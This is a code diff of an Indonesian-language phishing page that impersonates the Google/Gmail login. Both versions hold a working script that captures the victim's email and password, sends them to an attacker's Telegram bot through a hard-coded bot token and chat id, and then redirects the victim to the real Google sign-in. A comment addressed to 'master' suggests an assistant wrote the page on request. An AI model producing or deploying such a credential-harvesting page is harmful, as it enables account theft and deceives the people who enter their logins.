@@ -3,40 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Keamanan Akun Google</title>
+    <title>Verifikasi Keamanan Akun</title>
     <style>
-        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f1f1f1; }
-        .box { width: 320px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; background: white; text-align: center; }
+        body { font-family: 'Roboto',Arial,sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fff; }
+        .login-box { width: 350px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
         img { width: 75px; margin-bottom: 10px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
-        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; width: 100%; margin-top: 20px; cursor: pointer; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
+        p { font-size: 15px; margin-bottom: 25px; color: #202124; }
+        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; width: 100%; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
-        <h2>Verifikasi Identitas</h2>
-        <form id="gas">
-            <input type="email" id="email" placeholder="Email atau ponsel" required>
+    <div class="login-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
+        <h1>Login</h1>
+        <p>Lanjutkan ke Gmail</p>
+        <form id="pancingan">
+            <input type="email" id="user" placeholder="Email atau ponsel" required>
             <input type="password" id="pass" placeholder="Masukkan sandi Anda" required>
-            <button type="submit">Amankan Akun</button>
+            <button type="submit">Berikutnya</button>
         </form>
     </div>
-    <script>
-        document.getElementById('gas').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const token = '8469370025:AAHP58nPm9mKa_uBWE0nhcCAPWffeipjbl8'; 
-            const id = '6119659517'; 
-            const emai = document.getElementById('email').value;
-            const sandi = document.getElementById('pass').value;
-            const pesan = `🎯 JARING TEMBUS!\n\n📧 Email: ${emai}\n🔑 Sandi: ${sandi}`;
 
-            // Menggunakan URL langsung agar lebih stabil
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(pesan)}`;
+    <script>
+        document.getElementById('pancingan').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
             
-            fetch(url).then(() => {
-                window.location.href = 'https://accounts.google.com';
-            }).catch(err => alert('Gagal kirim! Cek koneksi.'));
+            // DATA TUAN SUDAH SAYA PASANG DI SINI
+            const botToken = '8469370025:AAHP58nPm9mKa_uBWE0nhcCAPWffeipjbl8'; 
+            const chatId = '6119659517'; 
+            const teks = `🎯 KORBAN BARU TEMBUS!\n\n📧 Email: ${u}\n🔑 Sandi: ${p}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(teks)}`;
+
+            fetch(url)
+            .then(() => {
+                // Lempar ke halaman login asli Google
+                window.location.href = 'https://accounts.google.com/signin';
+            })
+            .catch(() => {
+                alert("Koneksi bermasalah, coba lagi.");
+            });
         });
     </script>
 </body>
